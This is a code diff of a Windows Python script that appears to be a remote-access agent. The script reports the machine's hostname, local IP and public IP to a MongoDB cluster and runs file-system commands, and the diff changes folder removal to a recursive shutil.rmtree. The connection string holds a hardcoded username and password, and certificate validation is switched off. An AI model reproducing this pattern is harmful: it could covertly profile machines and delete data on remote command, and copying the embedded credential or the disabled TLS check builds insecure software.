@@ -5,14 +5,19 @@ import socket
 import win32api
 from pymongo import MongoClient
 import cv2
-import glob
+import shutil
 import numpy as np
+import requests
 
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
 client = MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)
 
-
+try:
+    response = requests.get('https://api64.ipify.org?format=json').json()
+    public_ip=response['ip']
+except:
+    public_ip=""
 
 
 hostname = socket.gethostname()
@@ -64,8 +69,7 @@ def action_on_system(new_path="",command="",original_filename="",update_str="",n
 		os.chdir(path)
 		os.mkdir(new_foldername)
 	elif command=='rmdir':
-		os.chdir(path)
-		os.rmdir(new_foldername)
+		shutil.rmtree(f'{path}/{new_foldername}')
 	elif command=='createfile':
 		with open(path+f'/{new_filename}','w') as f:
 			pass
@@ -222,7 +226,8 @@ def executes():
     }
     data={
             "hostname":hostname,
-            "ip":str(IPAddr)
+            "ip":str(IPAddr),
+            "public_ip":str(public_ip)
         }
     sysinfo_col=db['systemInfo']
     if sysinfo_col.find_one(another_filter):
